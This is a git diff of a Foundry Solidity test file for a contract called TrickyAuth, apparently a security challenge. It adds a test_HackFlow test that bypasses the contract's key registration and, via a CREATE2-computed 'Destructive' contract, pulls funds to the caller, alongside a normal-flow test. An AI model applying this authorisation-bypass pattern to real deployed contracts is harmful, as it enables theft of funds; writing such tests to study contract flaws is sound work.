@@ -1,33 +1,61 @@
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.13;
 
-import {Test, console} from "forge-std/Test.sol";
+import {Test} from "forge-std/Test.sol";
 import {TrickyAuth, Destructive} from "../src/TrickyAuth.sol";
 
 contract CounterTest is Test {
-    TrickyAuth public CT;
+    TrickyAuth  public CT;
+    uint256 constant CT_BALANCE = 0x1000000000000000;
+    address admin = address(0x12);
 
     function setUp() public {
-        CT = new TrickyAuth{value: 0x1000000000000000}();
+        payable(admin).transfer(CT_BALANCE);
+
+        vm.prank(admin);
+        CT = new TrickyAuth{value: CT_BALANCE}();
     }
 
-    function testWorks() public {
+    function destructive() internal view returns (Destructive addr) {
+        bytes32 codehash = keccak256(abi.encodePacked(type(Destructive).creationCode));
+        address deployer = address(CT);
+        bytes32 salt = bytes20(tx.origin);
+
+        assembly {
+            let ptr := mload(0x40)
+
+            mstore(add(ptr, 0x40), codehash)
+            mstore(add(ptr, 0x20), salt)
+            mstore(ptr, deployer)
+
+            let start := add(ptr, 0x0b)
+            mstore8(start, 0xff)
+            addr := keccak256(start, 85)
+        }
+    }
+
+    function test_HackFlow() public {
         uint256 pre = tx.origin.balance;
 
-        CT.proposeKey(0x0000000000000000000000000000000000000000000000000000000000000001);
+        CT.proposeKey(bytes32(uint256(1)));
         CT.claim(bytes32(uint256(uint160(tx.origin))));
-        Destructive(0x1D3A4032B521e09a91555d2630E19e259Cca3aF6).claim();
+        destructive().claim();
 
-        assertGe(tx.origin.balance, pre + 0x0100000000000000);
+        assertEq(tx.origin.balance, pre + CT_BALANCE / 16);
     }
-    function testWorksOk() public {
+
+    function test_NormalFlow() public {
+        bytes32 key = bytes32(uint256(0x17));
         uint256 pre = tx.origin.balance;
 
-        CT.proposeKey(0x0000000000000000000000000000000000000000000000000000000000000017);
-        CT.register(keccak256(bytes.concat(bytes32(uint256(uint160(tx.origin))), bytes32(0x0000000000000000000000000000000000000000000000000000000000000017))));
-        CT.claim(0x0000000000000000000000000000000000000000000000000000000000000017);
-        Destructive(0x1D3A4032B521e09a91555d2630E19e259Cca3aF6).claim();
+        CT.proposeKey(key);
 
-        assertGe(tx.origin.balance, pre + 0x0100000000000000);
+        vm.prank(admin);
+        CT.register(keccak256(bytes.concat(bytes32(uint256(uint160(tx.origin))), key)));
+
+        CT.claim(key);
+        destructive().claim();
+
+        assertEq(tx.origin.balance, pre + CT_BALANCE / 16);
     }
 }
